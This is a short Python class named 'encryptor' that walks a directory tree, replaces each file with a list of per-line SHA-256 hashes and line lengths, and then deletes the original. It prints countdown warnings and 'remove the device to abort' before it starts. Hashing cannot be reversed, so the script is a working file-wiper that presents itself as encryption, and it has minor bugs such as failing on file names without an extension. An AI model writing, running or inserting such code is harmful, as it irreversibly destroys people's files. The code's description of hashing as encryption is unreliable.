class encryptor():
	def __init__(self, path, t1):
		self.path = path
		self.t1 = t1

	def checkPath(self):
		print(self.path)

	def begin(self):
		import time
		time.sleep(self.t1)
		print('\t\t> encrypting with hash algorythm')
		time.sleep(self.t1)
		print('\t\t> encryption will begin in 5 seconds')
		time.sleep(self.t1)
		print('\t\t> remove the device to abort')
		time.sleep(0.5)
		import os, hashlib
		for (dirpath, dirnames, filenames) in os.walk(self.path):
			for file in filenames:
				file_path = os.path.join(dirpath, file)
				new_file_path = os.path.join(dirpath, file.split('.')[0] + '_' + file.split('.')[1] + '.hsh')
				with open(file_path, 'rb') as f:
					file_content = ([file[:-1] for file in f.readlines()])
					print('\t\t>>', file_path, '-->', new_file_path)
				with open(new_file_path, 'w+') as f:
					for line in file_content:
						length = len(line)
						line_hash = str(length) + '\t' + hashlib.sha256(line).hexdigest()
						f.write(line_hash + '\n')
					print('\t\t\t encrytped', file_path)
				os.remove(file_path)
		print('\t\tENCRYPTION PROCESS FINISHED')
